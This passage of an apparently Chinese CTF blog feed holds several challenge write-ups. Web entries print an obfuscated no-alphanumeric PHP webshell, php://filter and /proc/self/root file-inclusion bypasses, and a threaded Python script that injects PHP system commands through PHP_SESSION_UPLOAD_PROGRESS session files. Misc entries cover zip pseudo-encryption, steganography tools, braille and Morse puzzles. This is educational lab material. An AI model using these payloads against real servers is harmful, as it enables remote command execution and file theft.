class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$__</span>=~(站);<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$__</span>=[];<span class="hljs-variable">$_</span>=(<span class="hljs-variable">$__</span>==<span class="hljs-variable">$__</span>);<span class="hljs-variable">$__</span>=~(融);<span class="hljs-variable">$___</span>=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$__</span>=~(匆);<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>].<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$__</span>=~(随);<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$__</span>=~(千);<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$__</span>=~(苦);<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$____</span>=~(~(_));<span class="hljs-variable">$__</span>=~(诗);<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$__</span>=~(尘);<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$__</span>=~(欣);<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$__</span>=~(站);<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>[<span class="hljs-variable">$_</span>];<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure><p>然后就能任意命令执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs en">POST：system(&#x27;env&#x27;)<br></code></pre></td></tr></table></figure><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> upload </tag>
            
            <tag> webshell </tag>
            
            <tag> 无字母数字汉字取反构造webshell </tag>
            
            <tag> fuzz字典 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>九连环</title>
      <link href="/2025/04/19/%E4%B9%9D%E8%BF%9E%E7%8E%AF/"/>
      <url>/2025/04/19/%E4%B9%9D%E8%BF%9E%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h1><p>首先下载zip文件，然后解压出来一个jpg图片</p><p><img src="/../image/%E4%B9%9D%E8%BF%9E%E7%8E%AF-1.png"></p><p>直接放随波逐流里分析，发现隐藏了很多文件在里面。</p><p><img src="/../image/%E4%B9%9D%E8%BF%9E%E7%8E%AF-2.png"></p><p>使用Binwalk提取文件，提取出来一个c文件</p><p><img src="/../image/%E4%B9%9D%E8%BF%9E%E7%8E%AF-3.png"></p><p>解压看看发现存在一个qwe.zip和good-已合并.jpg图片文件，qwe.zip可以正常解压，但是jpg文件需要密码，猜测是zip伪加密。</p><p>用010editor打开4C68.zip，然后搜索jpg，将目录区的01改为00去除伪加密</p><p><img src="/../image/%E4%B9%9D%E8%BF%9E%E7%8E%AF-4.png"></p><p>现在得到了一张图片和一个压缩包，压缩包需要密码，试了前面学过的几种方法都找不到密码，然后发现是一种新的隐写方式 steghide</p><p>用steghide查看文件隐藏内容：</p><p>语法：steghide info filename</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">steghide</span> <span class="hljs-literal">info</span> good-已合并.jpg<br></code></pre></td></tr></table></figure><p><img src="/../image/%E4%B9%9D%E8%BF%9E%E7%8E%AF-5.png"></p><p>发现隐藏了一个ko.txt文件，然后继续用steghide提取隐藏文件</p><p>语法：steghide extract -sf filename</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">steghide extract -sf good-已合并<span class="hljs-string">.jpg</span><br></code></pre></td></tr></table></figure><p>然后注意需要按一次空格。</p><p>打开ko.txt，得到压缩包密码</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cos">看到这个图片就是压缩包的密码：<br>bV1g6t5wZDJif<span class="hljs-symbol">^J7</span><br></code></pre></td></tr></table></figure><p>然后使用密码将qwe.zip中的flag.txt解压出来，得到flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">1RTo8w@</span>&amp;<span class="hljs-symbol">4nK@</span>z*XL&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> zip伪加密 </tag>
            
            <tag> steghide隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MakePHPGreatAgain</title>
      <link href="/2025/04/19/MakePHPGreatAgain/"/>
      <url>/2025/04/19/MakePHPGreatAgain/</url>
      
        <content type="html"><![CDATA[<h1 id="MakePHPGreatAgain"><a href="#MakePHPGreatAgain" class="headerlink" title="MakePHPGreatAgain"></a>MakePHPGreatAgain</h1><p>打开靶机，直接给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>这里很明显是文件包含漏洞，但是没有用include用的是require_once，在调用require_once时php会检查该文件是否已经被包含过，如果是则不会再次包含，具体来讲，PHP的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，那么后面这个flag.php就不能再被require_once。</p><p>绕过方法</p><h2 id="解法一-proc-self-root"><a href="#解法一-proc-self-root" class="headerlink" title="解法一 &#x2F;proc&#x2F;self&#x2F;root&#x2F;"></a>解法一 &#x2F;proc&#x2F;self&#x2F;root&#x2F;</h2><p><code>/proc/self/root/</code>是指向<code>/</code>的符号链接，所以我们可以用伪协议配合多级符号链接的方法进行绕过。<br>&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;<br>是一个符号链接，它指向当前进程的当前工作目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><p>注意&#x2F;proc&#x2F;self&#x2F;root&#x2F;的个数要足够多</p><hr><h2 id="解法二-proc-self-cwd"><a href="#解法二-proc-self-cwd" class="headerlink" title="解法二 &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;"></a>解法二 &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>proc<span class="hljs-regexp">/self/</span>cwd/flag.php<br></code></pre></td></tr></table></figure><hr><h2 id="解法三-session文件包含"><a href="#解法三-session文件包含" class="headerlink" title="解法三  session文件包含"></a>解法三  session文件包含</h2><p>python脚本</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import threading<br>import sys<br><span class="hljs-attribute">session</span>=requests.session()<br><span class="hljs-attribute">sess</span>=<span class="hljs-string">&#x27;yu22x&#x27;</span><br><span class="hljs-attribute">url1</span>=<span class="hljs-string">&quot;http://e9a04310-f643-4a4d-a52d-9ea97f1ba8d7.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-attribute">url2</span>=<span class="hljs-string">&#x27;http://e9a04310-f643-4a4d-a52d-9ea97f1ba8d7.node5.buuoj.cn:81/?file=/tmp/sess_&#x27;</span>+sess<br>data1=&#123;<br><span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);echo md5(&#x27;1&#x27;)?&gt;&quot;</span><br>&#125;<br><br>file=&#123;<br><span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">&#x27;abc&#x27;</span><br>&#125;<br>cookies=&#123;<br><span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess<br>&#125;<br>def write():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.post(url1,<span class="hljs-attribute">data</span>=data1,files=file,cookies=cookies)<br>def read():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.post(url2)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br><span class="hljs-built_in">print</span>(r.text)<br>threads = [threading.Thread(<span class="hljs-attribute">target</span>=write),<br>       threading.Thread(<span class="hljs-attribute">target</span>=read)]<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>t.start()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> require_once </tag>
            
            <tag> session文件包含 </tag>
            
            <tag> PHP_SESSION_UPLOAD_PROGRESS </tag>
            
            <tag> 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>假如给我三天光明</title>
      <link href="/2025/04/19/%E5%81%87%E5%A6%82%E7%BB%99%E6%88%91%E4%B8%89%E5%A4%A9%E5%85%89%E6%98%8E/"/>
      <url>/2025/04/19/%E5%81%87%E5%A6%82%E7%BB%99%E6%88%91%E4%B8%89%E5%A4%A9%E5%85%89%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h1><p>首先题目给了一个zip文件，解压下来之后是一个，music.zip和pic.jpg，然后music里可以看到是一个音频文件。</p><p>先打开看看图片</p><p><img src="/../image/%E5%81%87%E5%A6%82%E7%BB%99%E6%88%91%E4%B8%89%E5%A4%A9%E5%85%89%E6%98%8E-1.png"></p><p>查了一下说是盲文，去网上找了个字母盲文对照图</p><p><img src="/../image/%E5%81%87%E5%A6%82%E7%BB%99%E6%88%91%E4%B8%89%E5%A4%A9%E5%85%89%E6%98%8E-2.png"></p><p>读出来的密文是：kmdonowg，应该就是music.zip的解压密码了</p><p>将音频文件解压下来，打开停了一下发现很像摩斯密码，用audacity打开看看</p><p><img src="/../image/%E5%81%87%E5%A6%82%E7%BB%99%E6%88%91%E4%B8%89%E5%A4%A9%E5%85%89%E6%98%8E-3.png">\</p><p>解密出摩斯密码</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">-<span class="hljs-string">.-.</span>  -  <span class="hljs-string">..-.</span>  <span class="hljs-string">.--</span>  <span class="hljs-string">.--.</span>  .  <span class="hljs-string">..</span>  <span class="hljs-params">-----</span>  <span class="hljs-params">---</span><span class="hljs-string">..</span>  --<span class="hljs-string">...</span>  <span class="hljs-string">...--</span>  <span class="hljs-string">..---</span>  <span class="hljs-string">..--..</span>  <span class="hljs-string">..---</span>  <span class="hljs-string">...--</span>  -<span class="hljs-string">..</span>  --<span class="hljs-string">..</span><br></code></pre></td></tr></table></figure><p>然后解码</p><p><img src="/../image/%E5%81%87%E5%A6%82%E7%BB%99%E6%88%91%E4%B8%89%E5%A4%A9%E5%85%89%E6%98%8E-4.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CTFWPEI08732</span>?<span class="hljs-number">23</span>D<br></code></pre></td></tr></table></figure><p>换小写</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;wpei08732?<span class="hljs-number">23</span>dz&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 经典盲文 </tag>
            
            <tag> 摩斯密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc学习</title>
      <link href="/2025/04/17/misc%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/04/17/misc%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf-wiki.org/misc/encode/computer/">misc简介</a></p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p><strong>1.伪加密原理：</strong></p><p>ZIP伪加密是通过修改ZIP文件结构中特定的‌<strong>全局方式位标记</strong>‌（通常位于压缩源文件目录区），使压缩包被识别为加密状态，但实际上并未对数据加密。关键点包括：</p><ul><li><p>‌<strong>文件结构</strong>‌：ZIP文件由三部分组成：压缩源文件数据区、目录区和目录结束标志。</p></li><li><p>‌<strong>加密标志位</strong>‌</p><p>‌<strong>数据区</strong>‌的全局方式位标记（如<code>00 00</code>表示无加密，<code>01 00</code>表示真加密）。</p><p>目录区的全局方式位标记（若为奇数如<code>09 00</code>或<code>01 00</code>，则被识别为加密，但数据区未加密时即为伪加密）。</p></li><li><p>‌<strong>伪装效果</strong>‌：仅修改目录区的标志位，实际数据未加密，因此无需密码即可破解。</p></li></ul><p><strong>2. ‌识别伪加密的方法‌</strong></p><ul><li><p>‌<strong>检查标志位</strong>‌使用十六进制编辑器（如Winhex或HxD）查看文件头：</p><p>搜索<code>50 4B 01 02</code>（目录区标识），定位到第9-10字节，若为奇数（如<code>09 00</code>）且数据区标志为<code>00 00</code>，则为伪加密。</p><p>真加密需数据区和目录区标志位均为奇数。</p></li></ul><p><img src="/../image/misc%E5%AD%A6%E4%B9%A0-1.png"></p><p>使用工具：010editor、winhex</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs tap">1.无加密： 压缩源文件数据区的全局方式位标记应当为00<span class="hljs-number"> 00 </span>（50 4B<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 14 </span>00 后） 且压缩源文件目录区的全局方式位标记应当为00<span class="hljs-number"> 00 </span>（50 4B<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 14 </span>00 后）<br><br>2.伪加密：<br>压缩源文件数据区的全局方式位标记应当为<span class="hljs-number"> 00 </span>00 （50 4B<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 14 </span>00 后） 且压缩源文件目录区的全局方式位标记应当为<span class="hljs-number"> 09 </span>00 （50 4B<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 14 </span>00 后）<br><br>3.真加密：<br>压缩源文件数据区的全局方式位标记应当为09<span class="hljs-number"> 00 </span>（50 4B<span class="hljs-number"> 03 </span>04<span class="hljs-number"> 14 </span>00 后）<br>且压缩源文件目录区的全局方式位标记应当为09<span class="hljs-number"> 00 </span>（50 4B<span class="hljs-number"> 01 </span>02<span class="hljs-number"> 14 </span>00 后）<br><br>4.修改方法：确定是伪加密后就需要将其修改为无加密，方法很简单，就是将压缩源文件目录区的全局方式位标记从09 00改为00 00。<br></code></pre></td></tr></table></figure><hr><h2 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h2><p>盲水印技术是一种用于隐藏信息的技术，通常用于在图像或文件中嵌入不可见的标记或信息，使得这些信息在不被察觉的情况下可以被追踪或识别。这种技术可以用于版权保护、追踪来源、甚至是隐藏秘密信息。</p><p>使用工具：BlindWaterMark</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span><span class="hljs-selector-class">.png</span>原图<br><span class="hljs-number">2</span><span class="hljs-selector-class">.png</span> 藏有盲水印的图片<br><span class="hljs-number">3</span><span class="hljs-selector-class">.png</span>盲水印图片<br><br><br>python bwmforpy3<span class="hljs-selector-class">.py</span> decode <span class="hljs-number">1</span><span class="hljs-selector-class">.png</span> <span class="hljs-number">2</span><span class="hljs-selector-class">.png</span> <span class="hljs-number">3</span>.png<br></code></pre></td></tr></table></figure><hr><h2 id="常见文件头、文件尾"><a href="#常见文件头、文件尾" class="headerlink" title="常见文件头、文件尾"></a>常见文件头、文件尾</h2><ul><li><p>JPEG (jpg)文件头：FF D8 FF；文件尾：FF D9</p></li><li><p>PNG (png)文件头：为89 50 4E 47 0D 0A 1A 0A，文件尾格式为49 45 4E 44 AE 42 60 82</p></li><li><p>GIF (gif) 文件头：47 49 46 38 39 61；文件尾：00 3B</p></li><li><p>TIFF (tif)文件头：49 49 2A 00</p></li><li><p>XML (xml)文件头：3C 3F 78 6D 6C</p></li><li><p>HTML (html)文件头：68 74 6D 6C 3E</p></li><li><p>Adobe Acrobat (pdf)文件头：25 50 44 46 2D 31 2E</p></li><li><p>ZIP Archive (zip)文件头：50 4B 03 04；文件尾：50 4B</p></li><li><p>TAR （tar.gz）文件头：1F 8B 08 00</p></li><li><p>RAR Archive (rar)文件头：526172211A0700 C43D7B00400700</p></li><li><p>Wave (wav)文件头：57415645</p></li><li><p>AVI (avi)，文件头：41564920</p></li><li><p>MS Word&#x2F;Excel (xls.or.doc)文件头：D0CF11E0</p></li><li><p>Adobe Photoshop (psd)文件头：38425053 Windows Bitmap (bmp) 文件头：424D</p></li></ul><hr><h2 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h2><p>原理：<a href="https://www.cnblogs.com/tolele/p/16271548.html">大佬博客</a></p><p>大概就是解码时会将多余的比特位去掉（因为凑不到8位），所以这部分多余的比特位即使我们随意的改变值也不会影响解码后的结果，因为它会被丢弃掉，所以就能在这些多余的比特位中实现隐写。</p><p>base64隐写提取脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Base64Stego_Decrypt</span>(<span class="hljs-params">LineList</span>):<br>    Base64Char = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     <span class="hljs-comment">#Base64字符集 已按照规范排列</span><br>    BinaryText = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> LineList:<br>        <span class="hljs-keyword">if</span> line.find(<span class="hljs-string">&quot;==&quot;</span>) &gt; <span class="hljs-number">0</span>:     <span class="hljs-comment">#如果文本中有2个=符号</span><br>            temp = <span class="hljs-built_in">bin</span>(Base64Char.find(line[-<span class="hljs-number">3</span>]) &amp; <span class="hljs-number">15</span>)[<span class="hljs-number">2</span>:]      <span class="hljs-comment">#通过按位与&amp;15运算取出二进制数后4位 [2:]的作用是将0b过滤掉</span><br>            BinaryText = BinaryText+<span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">4</span>-<span class="hljs-built_in">len</span>(temp))+temp      <span class="hljs-comment">#高位补0</span><br>        <span class="hljs-keyword">elif</span> line.find(<span class="hljs-string">&quot;=&quot;</span>) &gt; <span class="hljs-number">0</span>:        <span class="hljs-comment">#如果文本中有1个=符号</span><br>            temp = <span class="hljs-built_in">bin</span>(Base64Char.find(line[-<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">3</span>)[<span class="hljs-number">2</span>:]       <span class="hljs-comment">#通过按位与&amp;3运算取出二进制数后2位</span><br>            BinaryText = BinaryText+<span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(temp))+temp      <span class="hljs-comment">#高位补0</span><br>    Text = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(BinaryText) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>):       <span class="hljs-comment">#最终得到的隐写数据二进制位数不一定都是8的倍数，为了避免数组越界，加上一个判断</span><br>        <span class="hljs-comment">#print(&quot;警告:二进制文本位数有误，将进行不完整解析。&quot;)</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(BinaryText), <span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span>(i+<span class="hljs-number">8</span> &gt; <span class="hljs-built_in">len</span>(BinaryText)):<br>                Text = Text+<span class="hljs-string">&quot;-&quot;</span>+BinaryText[i:]<br>                <span class="hljs-keyword">return</span> Text<br>            <span class="hljs-keyword">else</span>:<br>                Text = Text+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(BinaryText[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(BinaryText), <span class="hljs-number">8</span>):<br>            Text = Text+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(BinaryText[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>))      <span class="hljs-comment">#将得到的二进制数每8位一组对照ASCII码转化字符</span><br>        <span class="hljs-keyword">return</span> Text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Base64_ForString_Decrypt</span>(<span class="hljs-params">Text</span>):     <span class="hljs-comment">#Base64解密</span><br>    <span class="hljs-keyword">try</span>:<br>        DecryptedText = <span class="hljs-built_in">str</span>(Text).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        DecryptedText = base64.b64decode(DecryptedText)<br>        DecryptedText = DecryptedText.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> DecryptedText<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    Course = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;filename:&quot;</span>)<br>    File = <span class="hljs-built_in">open</span>(Course, <span class="hljs-string">&quot;r&quot;</span>)<br>    LineList = File.read().splitlines()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The explicit content is:&quot;</span>)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> LineList:<br>        <span class="hljs-built_in">print</span>(Base64_ForString_Decrypt(line),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Steganography is:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Base64Stego_Decrypt(LineList))<br><br></code></pre></td></tr></table></figure><p>感觉不如随波逐流，太麻烦了。</p><hr><h2 id="NTFS交换数据流实现隐写"><a href="#NTFS交换数据流实现隐写" class="headerlink" title="NTFS交换数据流实现隐写"></a>NTFS交换数据流实现隐写</h2><p>原理：<a href="https://zhuanlan.zhihu.com/p/654643812">NTFS 交换数据流 实现隐藏文件</a></p><p><strong>注意：如果压缩包内文件有隐写，必须用winrar解压，不然是提取不出来的</strong></p><p>提取隐写。</p><p>方法一：</p><p>在1.txt文件所在的文件夹，右键选择“在终端中打开”，打开命令行输入以下命令，回车打开flag.txt文件。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">notepad</span> <span class="hljs-number">1</span>.txt:flag.txt<br></code></pre></td></tr></table></figure><p>方法二：<br>使用NtfsStreamsEditor工具</p><hr><h2 id="outguess隐写"><a href="#outguess隐写" class="headerlink" title="outguess隐写"></a>outguess隐写</h2><p>OutGuess 是一款通用的隐写工具，允许用户将隐藏信息插入到数据源的冗余位中。无论是PPM（便携式像素图）、PNM（便携式任意图）还是JPEG图像格式，OutGuess都能轻松处理。更令人兴奋的是，OutGuess的核心设计并不依赖于数据源的性质，只要提供相应的数据处理程序，它可以应用于任何类型的数据。<br>对于JPEG图像，OutGuess通过保留基于频率计数的统计数据，确保了隐写内容的不可检测性。在嵌入数据之前，OutGuess系统可以确定在保持频率计数统计数据的前提下，可以隐藏的最大消息大小。</p><p>使用outguess工具提取隐写文件。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">outguess</span> -k <span class="hljs-string">&#x27;key&#x27;</span> -r textfile outputfile<br></code></pre></td></tr></table></figure><hr><h2 id="字频隐写"><a href="#字频隐写" class="headerlink" title="字频隐写"></a>字频隐写</h2><p>一般都是杂乱无章的文本，然后通过统计字频后按照一定顺序排列即可看到隐写的信息</p><p>简单的字频分析python脚本</p><figure class="highlight 